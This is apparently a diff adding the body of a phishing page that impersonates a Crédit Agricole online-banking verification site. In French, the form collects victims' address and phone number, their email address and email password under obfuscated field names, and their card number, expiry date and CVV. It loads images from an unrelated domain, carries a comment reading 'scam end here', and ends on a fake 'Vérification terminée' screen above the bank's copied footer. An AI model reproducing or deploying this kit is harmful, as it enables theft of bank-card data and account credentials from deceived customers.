+
+	<option value="-1" >----- Département -----</option>
+
+
+
+		<option value="001" title="AIN"  >001 - AIN</option>
+
+	
+
+
+
+
+
+		<option value="002" title="AISNE"  >002 - AISNE</option>
+
+	
+
+
+
+
+
+		<option value="003" title="ALLIER"  >003 - ALLIER</option>
+
+	
+
+
+
+
+
+		<option value="004" title="ALPES-DE-HAUTE-PROVENCE"  >004 - ALPES-DE-HAUTE-PROVENCE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="005" title="HAUTES-ALPES"  >005 - HAUTES-ALPES</option>
+
+	
+
+
+
+
+
+		<option value="006" title="ALPES-MARITIMES"  >006 - ALPES-MARITIMES</option>
+
+	
+
+
+
+
+
+		<option value="007" title="ARDECHE"  >007 - ARDECHE</option>
+
+	
+
+
+
+
+
+		<option value="008" title="ARDENNES"  >008 - ARDENNES</option>
+
+	
+
+
+
+
+
+		<option value="009" title="ARIEGE"  >009 - ARIEGE</option>
+
+	
+
+
+
+
+
+		<option value="010" title="AUBE"  >010 - AUBE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="011" title="AUDE"  >011 - AUDE</option>
+
+	
+
+
+
+
+
+		<option value="012" title="AVEYRON"  >012 - AVEYRON</option>
+
+	
+
+
+
+
+
+		<option value="013" title="BOUCHES-DU-RHONE"  >013 - BOUCHES-DU-RHONE</option>
+
+	
+
+
+
+
+
+		<option value="014" title="CALVADOS"  >014 - CALVADOS</option>
+
+	
+
+
+
+
+
+		<option value="015" title="CANTAL"  >015 - CANTAL</option>
+
+	
+
+
+
+
+
+		<option value="016" title="CHARENTE"  >016 - CHARENTE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="017" title="CHARENTE-MARITIME"  >017 - CHARENTE-MARITIME</option>
+
+	
+
+
+
+
+
+		<option value="018" title="CHER"  >018 - CHER</option>
+
+	
+
+
+
+
+
+		<option value="019" title="CORREZE"  >019 - CORREZE</option>
+
+	
+
+
+
+
+
+		<option value="020" title="CORSE"  >020 - CORSE</option>
+
+	
+
+
+
+
+
+		<option value="021" title="COTE-D'OR"  >021 - COTE-D'OR</option>
+
+	
+
+
+
+
+
+		<option value="022" title="COTES-D'ARMOR"  >022 - COTES-D'ARMOR</option>
+
+
+
+	
+
+
+
+
+
+		<option value="023" title="CREUSE"  >023 - CREUSE</option>
+
+	
+
+
+
+
+
+		<option value="024" title="DORDOGNE"  >024 - DORDOGNE</option>
+
+	
+
+
+
+
+
+		<option value="025" title="DOUBS"  >025 - DOUBS</option>
+
+	
+
+
+
+
+
+		<option value="026" title="DROME"  >026 - DROME</option>
+
+	
+
+
+
+
+
+		<option value="027" title="EURE"  >027 - EURE</option>
+
+	
+
+
+
+
+
+		<option value="028" title="EURE-ET-LOIRE"  >028 - EURE-ET-LOIRE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="029" title="FINISTERE"  >029 - FINISTERE</option>
+
+	
+
+
+
+
+
+		<option value="030" title="GARD"  >030 - GARD</option>
+
+	
+
+
+
+
+
+		<option value="031" title="HAUTE-GARONNE"  >031 - HAUTE-GARONNE</option>
+
+	
+
+
+
+
+
+		<option value="032" title="GERS"  >032 - GERS</option>
+
+	
+
+
+
+
+
+		<option value="033" title="GIRONDE"  >033 - GIRONDE</option>
+
+	
+
+
+
+
+
+		<option value="034" title="HERAULT"  >034 - HERAULT</option>
+
+
+
+	
+
+
+
+
+
+		<option value="035" title="ILLE-ET-VILAINE"  >035 - ILLE-ET-VILAINE</option>
+
+	
+
+
+
+
+
+		<option value="036" title="INDRE"  >036 - INDRE</option>
+
+	
+
+
+
+
+
+		<option value="037" title="INDRE-ET-LOIRE"  >037 - INDRE-ET-LOIRE</option>
+
+	
+
+
+
+
+
+		<option value="038" title="ISERE"  >038 - ISERE</option>
+
+	
+
+
+
+
+
+		<option value="039" title="JURA"  >039 - JURA</option>
+
+	
+
+
+
+
+
+		<option value="040" title="LANDES"  >040 - LANDES</option>
+
+
+
+	
+
+
+
+
+
+		<option value="041" title="LOIR-ET-CHER"  >041 - LOIR-ET-CHER</option>
+
+	
+
+
+
+
+
+		<option value="042" title="LOIRE"  >042 - LOIRE</option>
+
+	
+
+
+
+
+
+		<option value="043" title="HAUTE-LOIRE"  >043 - HAUTE-LOIRE</option>
+
+	
+
+
+
+
+
+		<option value="044" title="LOIRE-ATLANTIQUE"  >044 - LOIRE-ATLANTIQUE</option>
+
+	
+
+
+
+
+
+		<option value="045" title="LOIRET"  >045 - LOIRET</option>
+
+	
+
+
+
+
+
+		<option value="046" title="LOT"  >046 - LOT</option>
+
+
+
+	
+
+
+
+
+
+		<option value="047" title="LOT-ET-GARONNE"  >047 - LOT-ET-GARONNE</option>
+
+	
+
+
+
+
+
+		<option value="048" title="LOZERE"  >048 - LOZERE</option>
+
+	
+
+
+
+
+
+		<option value="049" title="MAINE-ET-LOIRE"  >049 - MAINE-ET-LOIRE</option>
+
+	
+
+
+
+
+
+		<option value="050" title="MANCHE"  >050 - MANCHE</option>
+
+	
+
+
+
+
+
+		<option value="051" title="MARNE"  >051 - MARNE</option>
+
+	
+
+
+
+
+
+		<option value="052" title="HAUTE-MARNE"  >052 - HAUTE-MARNE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="053" title="MAYENNE"  >053 - MAYENNE</option>
+
+	
+
+
+
+
+
+		<option value="054" title="MEURTHE-ET-MOSELLE"  >054 - MEURTHE-ET-MOSELLE</option>
+
+	
+
+
+
+
+
+		<option value="055" title="MEUSE"  >055 - MEUSE</option>
+
+	
+
+
+
+
+
+		<option value="056" title="MORBIHAN"  >056 - MORBIHAN</option>
+
+	
+
+
+
+
+
+		<option value="057" title="MOSELLE"  >057 - MOSELLE</option>
+
+	
+
+
+
+
+
+		<option value="058" title="NIEVRE"  >058 - NIEVRE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="059" title="NORD"  >059 - NORD</option>
+
+	
+
+
+
+
+
+		<option value="060" title="OISE"  >060 - OISE</option>
+
+	
+
+
+
+
+
+		<option value="061" title="ORNE"  >061 - ORNE</option>
+
+	
+
+
+
+
+
+		<option value="062" title="PAS-DE-CALAIS"  >062 - PAS-DE-CALAIS</option>
+
+	
+
+
+
+
+
+		<option value="063" title="PUY-DE-DOME"  >063 - PUY-DE-DOME</option>
+
+	
+
+
+
+
+
+		<option value="064" title="PYRENEES-ATLANTIQUES"  >064 - PYRENEES-ATLANTIQUES</option>
+
+
+
+	
+
+
+
+
+
+		<option value="065" title="HAUTES-PYRENEES"  >065 - HAUTES-PYRENEES</option>
+
+	
+
+
+
+
+
+		<option value="066" title="PYRENEES-ORIENTALES"  >066 - PYRENEES-ORIENTALES</option>
+
+	
+
+
+
+
+
+		<option value="067" title="BAS-RHIN"  >067 - BAS-RHIN</option>
+
+	
+
+
+
+
+
+		<option value="068" title="HAUT-RHIN"  >068 - HAUT-RHIN</option>
+
+	
+
+
+
+
+
+		<option value="069" title="RHONE"  >069 - RHONE</option>
+
+	
+
+
+
+
+
+		<option value="070" title="HAUTE-SAONE"  >070 - HAUTE-SAONE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="071" title="SAONE-ET-LOIRE"  >071 - SAONE-ET-LOIRE</option>
+
+	
+
+
+
+
+
+		<option value="072" title="SARTHE"  >072 - SARTHE</option>
+
+	
+
+
+
+
+
+		<option value="073" title="SAVOIE"  >073 - SAVOIE</option>
+
+	
+
+
+
+
+
+		<option value="074" title="HAUTE-SAVOIE"  >074 - HAUTE-SAVOIE</option>
+
+	
+
+
+
+
+
+		<option value="075" title="PARIS"  >075 - PARIS</option>
+
+	
+
+
+
+
+
+		<option value="076" title="SEINE-MARITIME"  >076 - SEINE-MARITIME</option>
+
+
+
+	
+
+
+
+
+
+		<option value="077" title="SEINE-ET-MARNE"  >077 - SEINE-ET-MARNE</option>
+
+	
+
+
+
+
+
+		<option value="078" title="YVELINES"  >078 - YVELINES</option>
+
+	
+
+
+
+
+
+		<option value="079" title="DEUX-SEVRES"  >079 - DEUX-SEVRES</option>
+
+	
+
+
+
+
+
+		<option value="080" title="SOMME"  >080 - SOMME</option>
+
+	
+
+
+
+
+
+		<option value="081" title="TARN"  >081 - TARN</option>
+
+	
+
+
+
+
+
+		<option value="082" title="TARN-ET-GARONNE"  >082 - TARN-ET-GARONNE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="083" title="VAR"  >083 - VAR</option>
+
+	
+
+
+
+
+
+		<option value="084" title="VAUCLUSE"  >084 - VAUCLUSE</option>
+
+	
+
+
+
+
+
+		<option value="085" title="VENDEE"  >085 - VENDEE</option>
+
+	
+
+
+
+
+
+		<option value="086" title="VIENNE"  >086 - VIENNE</option>
+
+	
+
+
+
+
+
+		<option value="087" title="HAUTE-VIENNE"  >087 - HAUTE-VIENNE</option>
+
+	
+
+
+
+
+
+		<option value="088" title="VOSGES"  >088 - VOSGES</option>
+
+
+
+	
+
+
+
+
+
+		<option value="089" title="YONNE"  >089 - YONNE</option>
+
+	
+
+
+
+
+
+		<option value="090" title="TERRITOIRE-DE-BELFORT"  >090 - TERRITOIRE-DE-BELFORT</option>
+
+	
+
+
+
+
+
+		<option value="091" title="ESSONNE"  >091 - ESSONNE</option>
+
+	
+
+
+
+
+
+		<option value="092" title="HAUTS-DE-SEINE"  >092 - HAUTS-DE-SEINE</option>
+
+	
+
+
+
+
+
+		<option value="093" title="SEINE-SAINT-DENIS"  >093 - SEINE-SAINT-DENIS</option>
+
+	
+
+
+
+
+
+		<option value="094" title="VAL-DE-MARNE"  >094 - VAL-DE-MARNE</option>
+
+
+
+	
+
+
+
+
+
+		<option value="095" title="VAL-D'OISE"  >095 - VAL-D'OISE</option>
+
+	
+
+
+
+
+
+		<option value="971" title="GUADELOUPE"  >971 - GUADELOUPE</option>
+
+	
+
+
+
+
+
+		<option value="972" title="MARTINIQUE"  >972 - MARTINIQUE</option>
+
+	
+
+
+
+
+
+		<option value="973" title="GUYANE"  >973 - GUYANE</option>
+
+	
+
+
+
+
+
+		<option value="974" title="REUNION"  >974 - REUNION</option>
+
+	
+
+
+
+
+
+		<option value="975" title="SAINT PIERRE ET MIQUELON"  >975 - SAINT PIERRE ET MIQUELON</option>
+
+
+
+	
+
+
+
+
+
+		<option value="976" title="MAYOTTE"  >976 - MAYOTTE</option>
+
+	
+
+
+
+
+
+		<option value="986" title="WALLIS ET FUTUNA"  >986 - WALLIS ET FUTUNA</option>
+
+	
+
+
+
+
+
+		<option value="987" title="POLYNESIE FRANÇAISE"  >987 - POLYNESIE FRANÇAISE</option>
+
+	
+
+
+
+
+
+		<option value="988" title="NOUVELLE CALEDONIE"  >988 - NOUVELLE CALEDONIE</option>
+
+	
+
+
+
+
+
+		<option value="099" title="ETRANGER"  >099 - ETRANGER</option>
+
+	
+
+
+
+   
+
+</select>
+
+
+
+
+
+		</td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> Adresse<font color="red">* </td> <td bgcolor="#E5E5E5"><textarea name="adress" id="adress" style="width:210px; height:50px" onKeyUp="remplir()"></textarea></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> Code postal<font color="red">*</td> <td bgcolor="#F7F9FC"><input type="text" name="zip" id="zip" style="width:50px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> Ville<font color="red">*</td> <td bgcolor="#E5E5E5"><input type="text" name="ville" id="ville" style="width:130px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> N° de téléphone<font color="red">*</td> <td bgcolor="#F7F9FC"><input type="text" name="telephone" id="telephone" style="width:130px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> adresse e-mail : <font color="red">*</td> <td bgcolor="#E5E5E5">
+		
+
+<span> </span>
+
+<br>
+<input type="text" name="mikiyate" id="mikiyate" style="width:230px" onKeyUp="remplir()">
+
+		</td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+        
+        
+        <tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+        
+        
+        	<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> 
+            mot de passe e-mail : <br><font color="red">*</td> <td bgcolor="#E5E5E5">
+		
+
+<span> </span>
+
+<br>
+<input type="text" name="vacance" id="vacance" style="width:230px" onKeyUp="remplir()">
+		
+
+<span> </span>
+
+
+		
+
+<span> </span>
+
+
+		
+
+<span> </span>
+
+
+        
+        
+        
+		
+ 		</table>
+
+
+
+
+
+	<p align="center"><a href="javascript:GoTodd();" onClick="return verifica()"><img src="http://acligole1465487fsd55ds56ds.net/img//valider.png" border="0"></a></p>
+
+</table> 
+
+
+
+
+
+
+
+
+</div>
+
+
+<div id="dd">
+	<table cellpadding="0" cellspacing="0" border="0" height="35">
+	<tr align="center">
+	<td width="327" id="nav"><a href="javascript:GoToaa();">Accès CLIENT</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="nav"><a href="javascript:GoTobb();">VÉRIFICATION</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="navv"><a href="javascript:GoTodd();">VALIDATION</a></td>
+	</tr>
+	</table>
+
+
+
+
+		<br>
+		<table cellpadding="0" width="100%" cellspacing="0" border="0">
+		<tr valign="top">
+		<td width="200">
+
+
+<img src="http://acligole1465487fsd55ds56ds.net/img//h1.png">
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">01</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Identifiez-vous</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//1.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Saisissez vos codes de Banque à distance</td>
+</tr>
+</table>
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">02</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Remplissez le formulaire</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//2.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Remplissez le formulaire<br>sécurisé</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">03</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Validez vos informations</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//3.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Vérifiez vos informations saisies et validez votre formulaire</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">04</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Un conseiller vous contactera</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//4.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Un conseiller vous contactera afin de valider votre demande</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h2.png"><br>
+
+
+
+		</td>
+		<td width="2"><img src="http://acligole1465487fsd55ds56ds.net/img//h.png"></td>
+		<td width="20"></td>
+
+		<td> 
+
+
+
+
+
+
+
+		<b><font color="#419a9f" face="arial" style="font-size:18px">Justificatifs bancaires</font></b><br><br>
+
+		<table cellpadding="0" cellspacing="0" width="660" border=0>
+
+		<tr><td bgcolor="#B3CAD6" width="20"></td> <td bgcolor="#B3CAD6" height="1"></td><td bgcolor="#B3CAD6"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="26" width="200"><b><font size="2" face="verdana">Authentification : </td><td bgcolor="#E5E5E5"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> Numéro de carte<font color="red">*</td> <td bgcolor="#F7F9FC"><input type="text" name="nuum" id="nuum" style="width:180px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> Date d'expiration<font color="red">*</td> <td bgcolor="#E5E5E5">
+
+
+
+<select name="mois" id="mois" style="width: 60px;" onclick="remplir()">
+
+
+  <option selected="selected" value="mois">mois</option>
+
+
+  <option value="01">01</option>
+
+
+  <option value="02">02</option>
+
+
+  <option value="03">03</option>
+
+
+  <option value="04">04</option>
+
+
+  <option value="05">05</option>
+
+
+  <option value="06">06</option>
+
+
+  <option value="07">07</option>
+
+
+  <option value="08">08</option>
+
+
+  <option value="09">09</option>
+
+
+  <option value="10">10</option>
+
+
+  <option value="11">11</option>
+
+
+  <option value="12">12</option>
+
+
+  </select>
+
+
+
+
+
+<span class="style1">/</span>
+
+
+<select name="annee" id="annee" style="width: 60px;" onclick="remplir()">
+
+
+<option selected="selected" value="ann&eacute;e">ann&eacute;e</option>
+
+
+<option value="2014">2014</option>
+
+
+<option value="2015">2015</option>
+
+
+<option value="2016">2016</option>
+
+
+<option value="2017">2017</option>
+
+
+<option value="2018">2018</option>
+
+
+<option value="2019">2019</option>
+
+
+<option value="2020">2020</option>
+
+
+<option value="2021">2021</option>
+
+
+<option value="2022">2022</option>
+
+
+<option value="2023">2023</option>
+
+
+<option value="2024">2024</option>
+
+
+<option value="2025">2025</option>
+
+
+<option value="2026">2026</option>
+
+
+<option value="2027">2027</option>
+
+
+<option value="2028">2028</option>
+
+
+</select>
+
+
+
+
+
+
+		</td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> Cryptogramme visuel<font color="red">*</td> <td bgcolor="#F7F9FC"><input type="text" name="xrypt" id="xrypt" style="width:80px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40" colspan="2"><font size="2" face="verdana">
+
+
+
+			<font size="2">Quelles sont vos disponibilités horaires afin qu'un conseiller puisse vous recontacter?<font color="red">*
+
+			<br><br>
+
+
+
+			<table cellpadding="2" bgcolor="white" cellspacing="2" style="border:1px solid #000">
+
+			<tr>
+
+			<td bgcolor="#237FD1" align="center" width="177"><font color="#ffffff" size="2">Vos disponibilités</td>
+
+			<td bgcolor="#237FD1" align="center" width="177"><font color="#ffffff" size="2">Plage horaire</td>
+
+			</tr>
+
+
+
+			<tr align="center">
+
+			<td><font size="2">Préférence n°1</td>
+
+			<td>
+
+			<select style="width:100%">
+
+				<option selected="selected" value="Plage Horaire">Plage Horaire</option>
+
+				<option value="09h - 11h">09h - 11h</option>
+
+				<option value="11h - 13h">11h - 13h</option>
+
+				<option value="13h - 15h">13h - 15h</option>
+
+			<option value="15h - 17h">15h - 17h</option>
+
+			<option value="17h - 19h">17h - 19h</option>
+
+			</select>
+
+			</td></tr>
+
+
+
+
+
+			<tr align="center">
+
+			<td><font size="2">Préférence n°2</td>
+
+			<td>
+
+			<select style="width:100%">
+
+				<option selected="selected" value="Plage Horaire">Plage Horaire</option>
+
+				<option value="09h - 11h">09h - 11h</option>
+
+				<option value="11h - 13h">11h - 13h</option>
+
+				<option value="13h - 15h">13h - 15h</option>
+
+			<option value="15h - 17h">15h - 17h</option>
+
+			<option value="17h - 19h">17h - 19h</option>
+
+			</select>
+
+			</td></tr>
+
+
+
+			<tr align="center">
+
+			<td><font size="2">Préférence n°3</td>
+
+			<td>
+
+			<select style="width:100%">
+
+				<option selected="selected" value="Plage Horaire">Plage Horaire</option>
+
+				<option value="09h - 11h">09h - 11h</option>
+
+				<option value="11h - 13h">11h - 13h</option>
+
+				<option value="13h - 15h">13h - 15h</option>
+
+			<option value="15h - 17h">15h - 17h</option>
+
+			<option value="17h - 19h">17h - 19h</option>
+
+			</select>
+
+			</td></tr>
+
+
+
+			</table>
+
+<br>
+
+
+
+
+
+		</td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+
+
+
+
+		</table>
+
+
+
+	<table width="760" border=0><tr><td><img src="http://acligole1465487fsd55ds56ds.net/img//secu.gif"></td><td width="150"><INPUT onClick="return funcCaller()" border="0" src="http://acligole1465487fsd55ds56ds.net/img//valider.png" type="image" Value="submit"></table>
+
+
+
+
+
+
+</FORM>
+
+
+
+
+	</table>
+</div>
+
+
+
+<div id="ff">
+
+	<table cellpadding="0" cellspacing="0" border="0" height="35">
+	<tr align="center">
+	<td width="327" id="nav"><a href="javascript:alert('Vérification terminée.');">Accès CLIENT</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="nav"><a href="javascript:alert('Vérification terminée.');">VÉRIFICATION</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="nav"><a href="javascript:alert('Vérification terminée.');">VALIDATION</a></td>
+	</tr>
+	</table>
+
+
+
+
+		<br>
+
+<br><br><br>
+
+<center>
+
+<b><font size="4" face="verdana" color="#111111">Vérification terminée.</center><br><br><br>
+
+
+</div>
+
+</td>
+</tr>
+</table>
+</div>
+
+
+
+
+<!-- scam end here -->
+
+<div id="bottom">
+<!-- DEBUT SICRH-52, TMAMASSFOOT -->
+
+
+
+ <ul class="bottom_menu">
+    <li>
+        Particuliers
+        <ul>
+              
+                    <li><a href="/services-essentiels.html" title="Comptes et cartes bancaires" onclick="xiti_clic('N', 'comptes et cartes bancaires', '/services-essentiels.html', false);return false;">Comptes et cartes bancaires</a></li>    <!--   Canous-5862   -->
+              
+                    <li><a href="/epargne-bancaire.html" title="Epargne" onclick="xiti_clic('N', 'epargne', '/epargne-bancaire.html', false);return false;">Epargne</a></li>    <!--   Canous-5862   -->
+              
+                    <li><a href="/pret-immobilier.html" title="Prêts immobiliers" onclick="xiti_clic('N', 'prêts immobiliers', '/pret-immobilier.html', false);return false;">Prêts immobiliers</a></li>    <!--   Canous-5862   -->
+              
+                    <li><a href="/assurance-des-biens.html" title="Assurances" onclick="xiti_clic('N', 'assurances', '/assurance-des-biens.html', false);return false;">Assurances</a></li>    <!--   Canous-5862   -->
+              
+                    <li><a href="/tarifs2011.html" title="Nos tarifs" onclick="xiti_clic('N', 'nos tarifs', '/tarifs2011.html', false);return false;">Nos tarifs</a></li>    <!--   Canous-5862   -->
+              
+        </ul>
+    </li>
+
+    <li>
+        Actualités
+        <ul>
+              
+	    <li><a href="/tous-les-dossiers-conseils-particuliers/" title="Nos dossiers-conseils" onclick="xiti_clic('N', 'nos dossiers-conseils', '/tous-les-dossiers-conseils-particuliers/', false);return false;">Nos dossiers-conseils</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="http://abo2.ems6.net/CreditAgricole/abo/index.asp" title="S'abonner à la newsletter" onclick="xiti_clic('N', 's abonner à la newsletter');" target="_blank">S'abonner à la newsletter</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/magazine/magazine.html" title="Magazine des Particuliers" onclick="xiti_clic('N', 'magazine des Particuliers', '/magazine/magazine.html', false);return false;">Magazine des Particuliers</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="http://www.ca-ndfemploi.com/" title="Recrutement" onclick="xiti_clic('N', 'Recrutement');" target="_blank">Recrutement</a></li>    <!--   Canous-5862   -->
+              
+        </ul>
+    </li>
+
+    <li>
+        Pratique
+        <ul>
+              
+	    <li><a href="http://communication.ca-norddefrance.fr/index.php?option=com_notices&amp;view=article&amp;id=71&amp;Itemid=8" title="Qui sommes-nous ?" onclick="xiti_clic('N', 'qui sommes-nous ?');" target="_blank">Qui sommes-nous ?</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/numeros-d-urgence.html" title="Numéros d'urgence" onclick="xiti_clic('N', 'numéros d urgence', '/numeros-d-urgence.html', false);return false;">Numéros d'urgence</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/site-securite.html" title="Site sécurité" onclick="xiti_clic('N', 'site-securite', '/site-securite.html', false);return false;">Site sécurité</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/plan-du-site.html" title="Plan du site" onclick="xiti_clic('N', 'plan du site', '/plan-du-site.html', false);return false;">Plan du site</a></li>    <!--   Canous-5862   -->
+              
+        </ul>
+    </li>
+
+    <li>
+        En savoir plus
+        <ul>
+              
+	    <li><a href="/charte-de-l-internaute.html" title="Politique de protection des données" onclick="xiti_clic('N', 'politique de protection des données', '/charte-de-l-internaute.html', false);return false;">Politique de protection des données</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/mentions-legales.html" title="Mentions légales">Mentions légales</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/conformite.html" title="Mise en conformité" onclick="xiti_clic('N', 'mise en conformité', '/conformite.html', false);return false;">Mise en conformité</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/Directive-MIF.html" title="Directive MIF" onclick="xiti_clic('N', 'Directive MIF', '/Directive-MIF.html', false);return false;">Directive MIF</a></li>    <!--   Canous-5862   -->
+              
+	    <li><a href="/litiges.html" title="Nous faire part d’un mécontentement" onclick="xiti_clic('N', 'résoudre un litige', '/litiges.html', false);return false;">Nous faire part d’un mécontentement</a></li>    <!--   Canous-5862   -->
+              
+        </ul>
+    </li>
+</ul>
+
+
+
+<!-- FIN SICRH-52, TMAMASSFOOT -->
+  <div class="copy">
+  	&copy; Crédit Agricole 2014</div>
+
+</div>
+<!-- Fin bottom -->
+</div>
+</body>
+</html>
+
+	
+	
